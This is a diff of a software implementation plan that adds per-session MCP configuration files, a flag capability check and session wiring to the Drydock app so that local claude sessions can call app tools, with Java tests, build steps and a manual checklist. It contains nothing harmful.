         assertTrue(Files.exists(first));
         assertTrue(Files.exists(second));
     }
@@ -1684,11 +2768,23 @@ class McpConfigWriterTest {
 
         Path config = writer.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:1/mcp", "secret-token");
 
-        var permissions = Files.getPosixFilePermissions(config);
-        assertFalse(permissions.contains(java.nio.file.attribute.PosixFilePermission.OTHERS_READ),
+        Set<PosixFilePermission> permissions = Files.getPosixFilePermissions(config);
+        assertFalse(permissions.contains(PosixFilePermission.OTHERS_READ),
                 "a file holding a bearer token must not be world-readable: " + permissions);
-        assertFalse(permissions.contains(java.nio.file.attribute.PosixFilePermission.GROUP_READ),
+        assertFalse(permissions.contains(PosixFilePermission.GROUP_READ),
                 "a file holding a bearer token must not be group-readable: " + permissions);
+    }
+
+    @Test
+    void aTokenWithJsonMetacharactersIsEscapedNotConcatenated(@TempDir Path base) throws Exception {
+        // The token is base64url today, but the writer must not depend on that.
+        McpConfigWriter writer = new McpConfigWriter(base);
+
+        Path config = writer.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:1/mcp", "a\"b\\c");
+
+        JsonValue parsed = JsonParser.parse(Files.readString(config));
+        JsonValue entry = JsonPeek.field(JsonPeek.field(parsed, "mcpServers"), "drydock");
+        assertEquals("a\"b\\c", JsonPeek.str(JsonPeek.field(entry, "headers"), "X-Drydock-Session-Token"));
     }
 
     @Test
@@ -1704,16 +2800,23 @@ class McpConfigWriterTest {
     }
 
     @Test
-    void staleConfigsFromAPreviousRunArePurgedOnFirstWrite(@TempDir Path base) throws Exception {
-        // No terminal process survives an app restart, so every file present
-        // at startup is stale -- and each holds a token that no longer
-        // resolves. Mirrors ClaudeHookInstaller.purgeStaleActivity.
+    void purgeStaleDropsConfigsFromAPreviousRun(@TempDir Path base) throws Exception {
+        // No terminal process survives an app restart, so every file present at
+        // startup is stale -- and each holds a token that no longer resolves.
+        // Mirrors ClaudeHookInstaller.purgeStaleActivity.
         McpConfigWriter first = new McpConfigWriter(base);
         Path stale = first.writeFor(ManagedSessionId.newId(), "http://127.0.0.1:1/mcp", "old");
 
         new McpConfigWriter(base).purgeStale();
 
         assertFalse(Files.exists(stale));
+    }
+
+    @Test
+    void purgeStaleOnAFreshInstallIsSilent(@TempDir Path base) {
+        // The mcp/ directory does not exist yet on a first run; Files.list
+        // would throw NoSuchFileException.
+        new McpConfigWriter(base.resolve("never-created")).purgeStale();
     }
 }
 ```
@@ -1725,10 +2828,10 @@ Expected: FAIL — `McpConfigWriter` does not exist.
 
 - [ ] **Step 3: Write the config writer**
 
-Create `app/src/main/java/app/drydock/mcp/McpConfigWriter.java`. Requirements:
+Create `app/src/main/java/app/drydock/mcp/McpConfigWriter.java`:
 
 - Files live in `baseDirectory.resolve("mcp")`, named `<sessionId>.json`.
-- `writeFor` produces, via `JsonWriter` (never string concatenation — the token and URL must be properly escaped):
+- `writeFor` builds the value with `JsonValue` records and serializes with `JsonWriter.write` — never string concatenation, so the token and URL are properly escaped:
 
 ```json
 {
@@ -1742,19 +2845,19 @@ Create `app/src/main/java/app/drydock/mcp/McpConfigWriter.java`. Requirements:
 }
 ```
 
-- Write with temp-file-plus-`ATOMIC_MOVE`, exactly as `ClaudeHookInstaller.writeAtomically` does, so a concurrently launching `claude` never reads a partial file. **Create the file with owner-only permissions before writing** (`PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("rw-------"))`) — it holds a bearer token. Set the permissions on the temp file too, or the token is briefly world-readable.
-- `delete(sessionId)` uses `Files.deleteIfExists` and logs a WARNING on failure without throwing; a leftover config file is cosmetic next to failing a session close.
-- `purgeStale()` deletes every file in the directory, logging a WARNING on failure. Same reasoning as `ClaudeHookInstaller.purgeStaleActivity`, cited in a comment.
+- Write with temp-file-plus-`ATOMIC_MOVE`, as `ClaudeHookInstaller.writeAtomically` does (that method is `private static`, so reimplement it rather than calling it), so a concurrently launching `claude` never reads a partial file. **Create both the temp file and the target with owner-only permissions** — `PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("rw-------"))` — since the file holds a bearer token; setting them only on the target leaves the token briefly world-readable.
+- `delete(sessionId)` uses `Files.deleteIfExists` and logs a WARNING on failure without throwing: a leftover file is cosmetic next to failing a session close.
+- `purgeStale()` deletes every file in the directory. **Tolerate a missing directory** — on a first run it does not exist and `Files.list` would throw `NoSuchFileException`. Log a WARNING on any other failure and continue, mirroring `ClaudeHookInstaller.purgeStaleActivity`, which the Javadoc should cite.
 - All methods do filesystem I/O, so the Javadoc must state that callers invoke them off the FX thread (AGENTS.md).
 
 - [ ] **Step 4: Run test to verify it passes**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpConfigWriterTest'`
-Expected: PASS (6 tests)
+Expected: PASS (8 tests)
 
 - [ ] **Step 5: Write the failing capability test**
 
-Add to `app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java` — create the file with this package and class if it does not exist, and match the existing tests' construction style if it does:
+Append to `app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java`, matching its existing style:
 
 ```java
     @Test
@@ -1789,22 +2892,24 @@ Expected: FAIL — `helpMentionsMcpConfig` does not exist.
 
 - [ ] **Step 7: Add the capability**
 
-In `ClaudeCapabilityService`, next to the existing flag patterns:
+In `ClaudeCapabilityService`, next to the existing flag patterns (lines 36–40):
 
 ```java
-    private static final Pattern MCP_CONFIG_FLAG = Pattern.compile("--mcp-config\\b");
-```
+    // Not "--mcp-config\\b": '-' is a non-word character, so \b would also
+    // match "--mcp-config-verbose". Require a non-flag character after it.
+    private static final Pattern MCP_CONFIG_FLAG = Pattern.compile("--mcp-config(?![\\w-])");
 
-Note `\b` does not stop `--mcp-config-verbose` from matching, because `-` is a non-word character and thus already a boundary. Match the full form explicitly:
-
-```java
     /** Package-private for tests: conservative presence check for {@code --mcp-config}. */
     static boolean helpMentionsMcpConfig(String helpOutput) {
-        return Pattern.compile("--mcp-config(?![\\w-])").matcher(helpOutput).find();
+        return MCP_CONFIG_FLAG.matcher(helpOutput).find();
     }
 ```
 
-Then use `helpMentionsMcpConfig(help)` where the other flags are detected, and add `supportsMcpConfig` to `ClaudeCapabilities` as a new component **immediately before `version`**. Fix every construction site the compiler flags — including tests — passing `false` where a test does not care about MCP.
+Use it where the other flags are detected (around line 91–98), and add `supportsMcpConfig` to `ClaudeCapabilities` immediately before `version`. Fix the three construction sites the compiler flags:
+
+- `app/src/main/java/app/drydock/app/SessionManager.java:97` (`NO_CAPABILITIES`) — pass `false`.
+- `app/src/main/java/app/drydock/claude/ClaudeCapabilityService.java:98` — pass the detected value.
+- `app/src/test/java/app/drydock/app/SessionManagerTest.java:142` (`caps(...)` helper) — add a parameter, defaulting existing callers to `false`.
 
 - [ ] **Step 8: Run the full suite**
 
@@ -1816,42 +2921,48 @@ Expected: PASS
 ```bash
 git add app/src/main/java/app/drydock/mcp/McpConfigWriter.java \
         app/src/main/java/app/drydock/claude/ \
+        app/src/main/java/app/drydock/app/SessionManager.java \
         app/src/test/java/app/drydock/mcp/McpConfigWriterTest.java \
-        app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java
+        app/src/test/java/app/drydock/claude/ClaudeCapabilityServiceTest.java \
+        app/src/test/java/app/drydock/app/SessionManagerTest.java
 git commit -m "feat(mcp): per-session --mcp-config file and capability gate"
 ```
 
 ---
 
-### Task 8: Wire it into running sessions
+### Task 12: Wire it into running sessions
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java`
 - Modify: `app/src/main/java/app/drydock/app/SessionManager.java`
+- Modify: `app/src/main/java/app/drydock/ui/MainWorkspace.java`
 - Modify: `app/src/main/java/app/drydock/DrydockApplication.java`
-- Modify: `docs/manual-terminal-checklist.md`
-- Modify: `README.md`
+- Modify: `app/src/test/java/app/drydock/app/SessionManagerTest.java`
+- Modify: `docs/manual-terminal-checklist.md`, `README.md`
 - Test: `app/src/test/java/app/drydock/app/SessionManagerMcpFlagTest.java`
 
-**Interfaces:**
-- Consumes: everything from Tasks 1–7.
-- Produces: `void SessionManager.useMcpConfig(McpConfigWriter, McpSessionRegistry, String endpointUrl)`.
+**Reference — the analogous `--settings` wiring, all line numbers verified:**
+- `SessionManager.java:80` — `LOG`; `:111` — `private volatile Optional<Path> activitySettings`; `:165` — `useActivitySettings(Path)`.
+- `:711` — `activitySettingsFlag(ClaudeCapabilities, Optional<Path>)`; `:719` — `shellQuote`.
+- `:650` — `buildCreateCommand`; `:664` — `buildResumeCommand`. Both package-private statics.
+- **Three** local call sites, not two: `:254` (`buildCreateCommand`, `initial.id()` in scope), `:343` (`buildResumeCommand`, both `session.id()` and the `sessionId` parameter in scope), `:455` (`buildCreateCommand`, `cleared.id()` in scope).
+- `:685`/`:690` — `buildRemoteCreateCommand`/`buildRemoteResumeCommand`. **Leave untouched:** remote sessions get no MCP config.
+- `DrydockApplication.java:707` — `sessionManager.useActivitySettings(installer.settingsFile())`, inside `Platform.runLater` after off-FX I/O; `:636` — `stop()` with `closeQuietly` per-service isolation.
 
-**Reference — how the analogous `--settings` wiring works today:**
-- `SessionManager` holds `private volatile Optional<Path> activitySettings = Optional.empty();` (line ~111), set by `useActivitySettings(Path)` (line ~165).
-- `activitySettingsFlag(ClaudeCapabilities, Optional<Path>)` (line ~711) returns `" --settings " + shellQuote(path)` or `""`.
-- `buildCreateCommand` (line ~650) and `buildResumeCommand` (line ~664) append it.
-- `DrydockApplication` line ~707 calls `sessionManager.useActivitySettings(installer.settingsFile())`.
-- **Remote sessions** use `buildRemoteCreateCommand` / `buildRemoteResumeCommand`, which deliberately carry no local-path flags. Leave both untouched: per the spec, remote sessions get no MCP config.
+**Interfaces:**
+- Produces:
+  - `void SessionManager.useMcpConfig(McpConfigWriter, McpSessionRegistry, String endpointUrl)`
+  - `CompletableFuture<ManagedSessionId> MainWorkspace.startAgentSession(Path worktree, Optional<String> prompt)`
 
 - [ ] **Step 1: Write the failing flag test**
 
-Create `app/src/test/java/app/drydock/app/SessionManagerMcpFlagTest.java`. Mirror the construction style of the existing `SessionManager` tests; `buildCreateCommand` and `buildResumeCommand` are package-private statics, hence the same-package test:
+Create `app/src/test/java/app/drydock/app/SessionManagerMcpFlagTest.java`. `buildCreateCommand`/`buildResumeCommand` are package-private statics, hence the same-package test. `SessionManagerTest` already calls them statically with no JavaFX toolkit started, so no `Platform.startup()` is needed.
 
 ```java
 package app.drydock.app;
 
 import app.drydock.claude.ClaudeCapabilities;
+import app.drydock.domain.ManagedClaudeSession;
 import org.junit.jupiter.api.Test;
 
 import java.nio.file.Path;
@@ -1866,6 +2977,17 @@ class SessionManagerMcpFlagTest {
         return new ClaudeCapabilities(true, true, false, true, true, supportsMcpConfig, "1.0.0");
     }
 
+    /**
+     * A session with no claude id or name, so {@code buildResumeCommand} takes
+     * its bare-{@code --resume} branch. Built rather than passed as null:
+     * {@code buildResumeCommand} dereferences its argument immediately
+     * ({@code SessionManager.java:667}).
+     */
+    private static ManagedClaudeSession session() {
+        // Mirror the fixture in SessionManagerTest; adapt to its actual helper.
+        return SessionManagerTest.newSessionFixture();
+    }
+
     @Test
     void createCommandCarriesTheMcpConfigFlag() {
         String command = SessionManager.buildCreateCommand(capabilities(true), "my session", "sid-1",
@@ -1877,8 +2999,7 @@ class SessionManagerMcpFlagTest {
 
     @Test
     void resumeCommandCarriesTheMcpConfigFlagToo() {
-        String command = SessionManager.buildResumeCommand(
-                null, capabilities(true),
+        String command = SessionManager.buildResumeCommand(session(), capabilities(true),
                 Optional.of(Path.of("/base/hooks/settings.json")),
                 Optional.of(Path.of("/base/mcp/abc.json")));
 
@@ -1904,23 +3025,32 @@ class SessionManagerMcpFlagTest {
     @Test
     void aPathWithSpacesIsQuoted() {
         String command = SessionManager.buildCreateCommand(capabilities(true), "my session", "sid-1",
-                Optional.empty(), Optional.of(Path.of("/Users/me/Application Support/drydock/mcp/abc.json")));
+                Optional.empty(),
+                Optional.of(Path.of("/Users/me/Application Support/drydock/mcp/abc.json")));
 
         assertTrue(command.contains("'/Users/me/Application Support/drydock/mcp/abc.json'"), command);
+    }
+
+    @Test
+    void remoteCommandsCarryNoLocalConfigPath() {
+        // Remote sessions get no MCP config: claude runs on the host and cannot
+        // reach 127.0.0.1 here.
+        assertFalse(SessionManager.buildRemoteCreateCommand(SessionManagerTest.newRemoteFixture())
+                .contains("--mcp-config"));
     }
 }
 ```
 
-If `buildResumeCommand`'s first parameter cannot be `null` in practice, build a minimal `ManagedClaudeSession` the way the existing `SessionManager` tests do and use that instead.
+Read `app/src/test/java/app/drydock/app/SessionManagerTest.java` first and reuse its existing session and remote fixtures; if they are inline rather than named helpers, extract them to package-private statics (`newSessionFixture`, `newRemoteFixture`) as part of this step, or inline equivalents here.
 
 - [ ] **Step 2: Run test to verify it fails**
 
 Run: `./gradlew :app:test --tests 'app.drydock.app.SessionManagerMcpFlagTest'`
-Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the extra `Optional<Path>` parameters do not exist yet.
+Expected: FAIL — `buildCreateCommand`/`buildResumeCommand` do not yet take the extra `Optional<Path>`.
 
 - [ ] **Step 3: Add the flag to `SessionManager`**
 
-- Add `private volatile Optional<Path> mcpConfigDirectory` is **not** what is needed — the path is per session, not global. Instead hold the collaborators:
+Hold the collaborators, since the path is per session rather than global:
 
 ```java
     /** Set once at startup when the MCP server started; empty when it did not. */
@@ -1930,9 +3060,9 @@ Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the ex
     private record McpWiring(McpConfigWriter writer, McpSessionRegistry registry, String endpointUrl) { }
 
     /**
-     * Enables per-session MCP config injection. Empty until called, so a
-     * failed MCP startup degrades to sessions without Drydock tools rather
-     * than sessions that fail to launch -- the same trade-off
+     * Enables per-session MCP config injection. Empty until called, so a failed
+     * MCP startup degrades to sessions without Drydock tools rather than
+     * sessions that fail to launch -- the same trade-off
      * {@link #useActivitySettings} makes for the activity hooks.
      */
     public void useMcpConfig(McpConfigWriter writer, McpSessionRegistry registry, String endpointUrl) {
@@ -1940,7 +3070,7 @@ Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the ex
     }
 ```
 
-- Add a helper that mints the token and writes the file, returning the path, and **is called on the background executor** in the same `thenApplyAsync` block that builds the command (never on the FX thread — it does file I/O):
+Add the minting helper, called on the background executor in the same block that builds the command:
 
 ```java
     /**
@@ -1948,18 +3078,22 @@ Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the ex
      * Returns empty when MCP is not wired up or the write failed: a session
      * without Drydock tools is strictly better than one that fails to launch.
      * Performs file I/O -- background executor only.
+     *
+     * @param spawn whether this session may create worktrees and start further
+     *              sessions. {@code FORBIDDEN} for a session an agent started,
+     *              which is what makes fan-out depth 1.
      */
-    private Optional<Path> mcpConfigFor(ManagedSessionId sessionId) {
+    private Optional<Path> mcpConfigFor(ManagedSessionId sessionId, Spawn spawn) {
         Optional<McpWiring> wiring = mcpWiring;
         if (wiring.isEmpty()) {
             return Optional.empty();
         }
         McpWiring mcp = wiring.get();
         try {
-            String token = mcp.registry().mint(sessionId);
+            String token = mcp.registry().mint(sessionId, spawn);
             return Optional.of(mcp.writer().writeFor(sessionId, mcp.endpointUrl(), token));
         } catch (IOException e) {
-            // Do not log the token or the URL (it carries the port).
+            // Never log the token or the URL (it carries the port).
             LOG.log(Level.WARNING, "Could not write MCP config for session " + sessionId
                     + "; launching without Drydock tools: " + e.getMessage());
             mcp.registry().revoke(sessionId);
@@ -1968,16 +3102,16 @@ Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the ex
     }
 ```
 
-- Add the flag builder next to `activitySettingsFlag`:
+Add the flag builder next to `activitySettingsFlag`:
 
 ```java
     /**
      * Adds {@code --mcp-config <file>} so the session can call back into this
-     * app (see {@code app.drydock.mcp.McpServer}). Empty whenever the
-     * installed claude lacks the flag or no config file could be written.
+     * app (see {@code app.drydock.mcp.McpServer}). Empty whenever the installed
+     * claude lacks the flag or no config file could be written.
      *
-     * <p>No {@code --strict-mcp-config}: that would suppress the user's own
-     * MCP servers, and Drydock's tools are an addition to their setup, not a
+     * <p>No {@code --strict-mcp-config}: that would suppress the user's own MCP
+     * servers, and Drydock's tools are an addition to their setup, not a
      * replacement for it.</p>
      */
     private static String mcpConfigFlag(ClaudeCapabilities capabilities, Optional<Path> mcpConfig) {
@@ -1988,85 +3122,113 @@ Expected: FAIL — the five-argument `ClaudeCapabilities` constructor and the ex
     }
 ```
 
-- Add an `Optional<Path> mcpConfig` parameter to `buildCreateCommand` and `buildResumeCommand`, appending `mcpConfigFlag(capabilities, mcpConfig)` after the existing `activitySettingsFlag(...)` call. Update both call sites (around lines 254 and 455) to pass `mcpConfigFor(<the session's ManagedSessionId>)`.
+Then:
+
+- Add a trailing `Optional<Path> mcpConfig` parameter to `buildCreateCommand` and `buildResumeCommand`, appending `mcpConfigFlag(capabilities, mcpConfig)` after the existing `activitySettingsFlag(...)`.
+- Update **all three** call sites — `:254`, `:343`, `:455` — passing `mcpConfigFor(<id>, <spawn>)`. Note the `:254` command is wrapped in `System.getProperty("app.drydock.diag.command", ...)`, so compute `mcpConfigFor` into a local first rather than inline, or a diag override still mints a token and writes a file it then discards.
+- The `spawn` value comes from how the session was created: `Spawn.ALLOWED` normally, `Spawn.FORBIDDEN` when `MainWorkspace.startAgentSession` requested it. Thread it through as a parameter on the session-open path.
 - Leave `buildRemoteCreateCommand` and `buildRemoteResumeCommand` untouched.
-- Where a session is closed or removed, call `mcpWiring`'s `registry.revoke(sessionId)` and `writer.delete(sessionId)` — a dead session's token must stop resolving, and its file must not linger with a live-looking credential.
+- Where a session is closed or removed, call the wiring's `registry.revoke(sessionId)` and `writer.delete(sessionId)`.
+- Fix the **14** existing `buildCreateCommand`/`buildResumeCommand` calls in `SessionManagerTest.java` (lines 150, 158, 166, 174, 182, 188, 194, 200, 209, 219, 229, 236, 252, 260) by appending `Optional.empty()`.
 
-- [ ] **Step 4: Run test to verify it passes**
+- [ ] **Step 4: Run tests to verify they pass**
 
-Run: `./gradlew :app:test --tests 'app.drydock.app.SessionManagerMcpFlagTest'`
-Expected: PASS (5 tests)
+Run: `./gradlew :app:test --tests 'app.drydock.app.SessionManagerMcpFlagTest' --tests 'app.drydock.app.SessionManagerTest'`
+Expected: PASS
 
-- [ ] **Step 5: Write the production `McpSessionContext`**
+- [ ] **Step 5: Add the `MainWorkspace` entry point**
 
-Create `app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java`, implementing the interface against the real services:
+No existing method fits: `openNewSession(Repository, Optional<String>)` (`:525`) and `openNewWorktreeSession(Repository, String, Path, Optional<String>, boolean)` (`:592`) both return `void` and need a `Repository` and branch, and `session_start` has only a path.
 
-- Constructor takes what it needs — `SessionManager`, `AnnotationStore`, `GitStatusService`, `WorktreeService`, the repository catalog, and a `BiFunction<Path, Optional<String>, CompletableFuture<ManagedSessionId>>` supplied by `MainWorkspace` for `startSession` (that one genuinely needs the FX thread to open a tab).
-- `annotations(caller)` → `annotationStore.forSession(caller)`; `updateAnnotation` → `annotationStore.update(annotation)` followed by `annotationStore.flushPendingSaves()`, so a subsequent read by the human's UI sees it.
-- `worktreesOf(root)` → `worktreeService.list(root)`, joined with a timeout, mapping the futures' `Worktree::path`.
-- `createWorktree(root, branch, startPoint)` → derive the directory name with `WorktreeNaming` exactly as `MainWorkspace` does, then `gitStatusService.createWorktree(root, directory, branch, startPoint)` joined with a timeout.
-- `startSession(worktree, prompt)` → invoke the FX-thread callback and join **with a timeout**.
-- Every `join` is `future.get(timeout, TimeUnit.SECONDS)`, and on `TimeoutException` throws `McpToolException("Drydock did not respond in time; the app may be busy.")`. On `ExecutionException`, unwrap the cause and translate the known types into their own messages: `WorktreeLockedException`, `WorktreeNotCleanException`, `GitExecutableNotFoundException`, `GitCommandFailedException` (include the stderr excerpt it carries), `SshUnreachableException`.
+Add `public CompletableFuture<ManagedSessionId> startAgentSession(Path worktree, Optional<String> prompt)`:
 
-- [ ] **Step 6: Wire the lifecycle in `DrydockApplication`**
+- Runs on the FX thread (assert it), since it opens a tab.
+- Resolves the `Repository` and branch from `worktree` using the registry the workspace already holds — the same lookup the sidebar does for a worktree row.
+- Delegates to the same path `openNewWorktreeSession` uses, but requests `Spawn.FORBIDDEN` and completes the future with the id from `SessionManager.prepareWorktreeSession` (`SessionManager.java:199`), which returns the `ManagedClaudeSession` before launch.
+- Completes exceptionally if the worktree does not belong to a registered repository.
 
-Near the existing `installer.settingsFile()` call (around line 707):
+- [ ] **Step 6: Write the production `McpSessionContext`**
 
-- Construct `McpSessionRegistry`, `McpConfigWriter` (same base directory the `ClaudeHookInstaller` uses), call `purgeStale()`, build `WorkspaceMcpSessionContext` and `McpToolRouter`, construct and `start()` the `McpServer`, then `sessionManager.useMcpConfig(writer, registry, server.endpointUrl())`.
-- Do this **off the FX thread**, on the same startup path the hook install already uses. Wrap in `try/catch (IOException)`: log a WARNING and skip `useMcpConfig`, so the app still starts without MCP.
-- Register `server.close()` in `stop()`, inside the existing per-service exception isolation so one failure cannot skip the rest.
-- Log the fact that the server started, but **not** the port.
+Create `app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java`:
 
-- [ ] **Step 7: Verify the app builds and starts**
+- Constructor takes `SessionManager`, `AnnotationStore`, `GitStatusService`, `WorktreeService`, `UserConfig` (or a supplier, since `load()` is blocking), the repository catalog, and a `BiFunction<Path, Optional<String>, CompletableFuture<ManagedSessionId>>` bound to `MainWorkspace.startAgentSession`.
+- `annotations(caller)` → `annotationStore.forSession(caller)`. `updateAnnotation` → `annotationStore.update(annotation)` then `flushPendingSaves()`; the store's new change listener (Task 2) is what refreshes the human's view.
+- `baseBranch(caller)` → the base branch for the caller's repository, the same value the Review view uses.
+- `excerpt(caller, file, line, context)` → read the file under the caller's worktree, return the requested window, and return empty for a missing file or an out-of-range line. Resolve the path under the worktree and reject anything that escapes it.
+- `realWorktreesOf(caller)` → `worktreeService.list(root)`, mapping `Worktree::path` through `toRealPath()`, skipping entries whose path no longer exists.
+- `remoteNames(caller)` → the repository's configured remotes; `GitStatusService` already loads these for the create-worktree modal.
+- `createWorktree(caller, branch, startPoint)` → derive the directory with `WorktreeNaming.defaultDirectory(home, userConfig.worktreesDirectory(), repository.displayName(), branch)` (Task 1 made this reachable), then `gitStatusService.createWorktree(root, directory, branch, startPoint)`.
+- `repositories()` → for **local** repositories only, fetch git status; for remote ones, emit `Optional.empty()` for dirty/ahead/behind without any probe.
+- Every `join` is `future.get(timeout, TimeUnit.SECONDS)`. On `TimeoutException` throw `McpToolException("Drydock did not respond in time; the app may be busy.")`. On `ExecutionException`, unwrap and translate the known types into their own messages: `WorktreeLockedException`, `WorktreeNotCleanException`, `GitExecutableNotFoundException`, `GitCommandFailedException` (include its `stderrExcerpt()`), `SshUnreachableException`.
+
+- [ ] **Step 7: Wire the lifecycle in `DrydockApplication`**
+
+Near the existing hook install (around `:694-715`):
+
+- Construct `McpSessionRegistry` and `McpConfigWriter` (same base directory as `ClaudeHookInstaller`), call `purgeStale()`, build `WorkspaceMcpSessionContext` and `McpToolRouter`, construct and `start()` the `McpServer`, then `sessionManager.useMcpConfig(writer, registry, server.endpointUrl())`.
+- Do the I/O and `start()` off the FX thread on the existing startup virtual thread; do the `useMcpConfig` call inside `Platform.runLater`, matching the `useActivitySettings` pattern at `:707`.
+- Wrap in `try/catch (IOException)`: log a WARNING and skip `useMcpConfig`, so the app still starts without MCP.
+- Register `server.close()` in `stop()` via the existing `closeQuietly` isolation.
+- Log that the server started; **never** the port.
+
+- [ ] **Step 8: Verify the app builds and starts**
 
 Run: `./gradlew :app:test`
 Expected: PASS
 
 Run: `./gradlew :app:run`
-Expected: the app window opens with no exception in the log; the log records that the MCP server started, with no port or token in the output.
+Expected: the window opens with no exception; the log records that the MCP server started, with no port or token in the output.
 
-- [ ] **Step 8: Add the manual checklist entry**
+- [ ] **Step 9: Add the manual checklist entry**
 
-Append to `docs/manual-terminal-checklist.md` a section titled "MCP server (spec 2026-07-25)" with these steps, matching the file's existing format:
+Append to `docs/manual-terminal-checklist.md` a section "MCP server (spec 2026-07-25)", matching the file's format. Record that it is not covered by automated tests, and why: like Gate 0E, it needs a real `claude` and a real account.
 
-1. Start a session in a local repository. In the terminal, run `/mcp` and confirm a `drydock` server appears as connected, listing the six tools.
-2. Ask the session: "call the repos_list tool and tell me what you see." Confirm it names your registered repositories and their branches.
-3. In the Review view, leave an annotation on a changed line. Ask the session: "read the review comments and address them." Confirm it reports the annotation text, and that the thread flips to "addressed by Claude" with a `Claude`-authored note.
-4. Confirm the human `ADDRESSED → RESOLVED` action works.
-5. Ask the session to create a worktree and start a session in it. Confirm a new sidebar entry and terminal tab appear.
-6. Ask the session to call `session_start` with a path outside the repository (e.g. `/tmp`). Confirm it is refused with a message naming the path.
-7. Start a **remote SSH** session. Run `/mcp` and confirm no `drydock` server is listed — remotes get no config by design.
-8. Close a session, then confirm its file under `<base>/mcp/` is gone.
+1. Start a session in a local repository. Run `/mcp` and confirm a `drydock` server appears **connected**, listing six tools. *A protocol-level handshake failure would leave every unit test green and the feature inert, so this is the gate that matters most.*
+2. Ask the session to call `repos_list`. Confirm it names your registered repositories and branches, and that a registered **remote** repository appears without dirty/ahead/behind.
+3. In the Review view, leave an annotation on a changed line. Ask the session to read the review comments and address them. Confirm it reports the annotation text **and the excerpt**, and that the thread flips to "addressed" with a `Claude`-authored note.
+4. **With the Review tab still open**, confirm the card updates live — the change listener from Task 2 — and that clicking Resolve afterwards keeps the agent's note.
+5. Confirm the summary line counts the addressed thread, and that the thread's button reads "Resolve", not "Reopen".
+6. Ask the session to create a worktree and start a session in it. Confirm a new sidebar entry and terminal tab appear.
+7. In that **new** session, run `/mcp`, then ask it to create a worktree. Confirm it is refused as an agent-started session — fan-out is depth 1.
+8. Ask the original session to create five worktrees. Confirm the fifth is refused, naming the limit.
+9. Ask a session to call `worktree_create` with branch `origin/main`. Confirm it is refused before git runs.
+10. Ask a session to call `session_start` with a path outside the repository (e.g. `/tmp`). Confirm it is refused, naming the path.
+11. Start a **remote SSH** session. Run `/mcp` and confirm no `drydock` server is listed, and that the session's banner says Drydock tools are unavailable for remote sessions.
+12. Close a session, then confirm its file under `<base>/mcp/` is gone and that a `curl` with its old token gets 401.
+13. Build the packaged app (`./gradlew :app:appImage`), launch it, and repeat step 1. This is the only check that catches a missing `jdk.httpserver`.
 
-Record that this is not covered by automated tests, and why: like Gate 0E, it needs a real `claude` and a real account.
-
-- [ ] **Step 9: Update the README**
+- [ ] **Step 10: Update the README**
 
 Add to the Features list, after the "Git & GitHub awareness" bullet:
 
 ```markdown
 - **MCP tools for your sessions** — sessions Drydock starts can call back into
-  the app: read the review comments you left on a diff and mark them
-  addressed, create worktrees and open sessions in them, and list your
-  registered repositories and running sessions. Local sessions only; remote
-  SSH sessions do not get these tools.
+  the app: read the review comments you left on a diff and reply to them,
+  create worktrees and open sessions in them (bounded, and a session an agent
+  started cannot spawn further ones), and list your registered repositories
+  and running sessions. Local sessions only; remote SSH sessions do not get
+  these tools.
 ```
 
-- [ ] **Step 10: Full verification**
+- [ ] **Step 11: Full verification**
 
 Run: `./gradlew :app:test`
-Expected: PASS, all 45+ test classes.
+Expected: PASS
 
-Run: `grep -rn "127.0.0.1\|0.0.0.0" app/src/main/java/app/drydock/mcp/McpServer.java`
-Expected: loopback only; no `0.0.0.0` anywhere.
+Run: `grep -rn "0.0.0.0" app/src/main/java/app/drydock/mcp/`
+Expected: no match — loopback only.
 
-- [ ] **Step 11: Commit**
+Run: `grep -rn "app.drydock.ui" app/src/main/java/app/drydock/mcp/`
+Expected: no match — the router must not depend on the UI package.
+
+- [ ] **Step 12: Commit**
 
 ```bash
 git add app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java \
         app/src/main/java/app/drydock/app/SessionManager.java \
+        app/src/main/java/app/drydock/ui/MainWorkspace.java \
         app/src/main/java/app/drydock/DrydockApplication.java \
-        app/src/test/java/app/drydock/app/SessionManagerMcpFlagTest.java \
+        app/src/test/java/app/drydock/app/ \
         docs/manual-terminal-checklist.md README.md
 git commit -m "feat(mcp): inject per-session MCP config into local claude sessions"
 ```
@@ -2075,10 +3237,12 @@ git commit -m "feat(mcp): inject per-session MCP config into local claude sessio
 
 ## Verification Summary
 
-After Task 8, all of the following must hold:
+After Task 12, all of the following must hold:
 
 - `./gradlew :app:test` passes.
 - `./gradlew :app:run` starts the app with the MCP server up and no port or token in the log.
-- The manual checklist section in `docs/manual-terminal-checklist.md` has been walked end to end against a real `claude` session.
-- `grep -rn "remove\|delete\|merge" app/src/main/java/app/drydock/mcp/McpToolRouter.java` shows no destructive tool.
-- Remote SSH sessions list no `drydock` MCP server.
+- The packaged app (`./gradlew :app:appImage`) shows `drydock` connected under `/mcp` — the check that catches a missing `jdk.httpserver`.
+- The manual checklist section has been walked end to end against a real `claude` session, including the depth-1 and budget refusals.
+- `grep -rn "app.drydock.ui" app/src/main/java/app/drydock/mcp/` is empty.
+- `grep -nE "remove|delete|merge|--force" app/src/main/java/app/drydock/mcp/McpToolRouter.java` shows no destructive tool.
+- Remote SSH sessions list no `drydock` MCP server, and say so in their banner.
